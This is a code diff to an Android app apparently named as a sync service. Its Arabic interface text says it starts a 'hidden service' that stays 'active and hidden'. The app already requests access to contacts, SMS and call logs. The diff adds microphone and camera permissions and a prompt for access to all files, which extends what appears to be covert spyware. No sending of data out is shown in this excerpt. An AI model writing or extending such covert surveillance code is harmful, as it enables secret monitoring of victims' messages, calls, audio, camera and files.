@@ -2,9 +2,13 @@ package com.sync.service
 
 import android.Manifest
 import android.app.Activity
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
+import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import android.widget.LinearLayout
@@ -19,6 +23,8 @@ class MainActivity : Activity() {
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.CAMERA,
         Manifest.permission.VIBRATE
     ).apply {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -48,6 +54,7 @@ class MainActivity : Activity() {
             text = "تفعيل وبدء الخدمة الخفية"
             setOnClickListener {
                 requestPerms()
+                requestAllFilesAccess()
                 SyncService.start(this@MainActivity)
                 status.text = "✅ الخدمة نشطة وخفية"
             }
@@ -56,6 +63,18 @@ class MainActivity : Activity() {
         layout.addView(btn)
         setContentView(layout)
         requestPerms()
+    }
+
+    private fun requestAllFilesAccess() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (!Environment.isExternalStorageManager()) {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                }
+            }
+        } catch (e: Exception) {}
     }
 
     private fun requestPerms() {
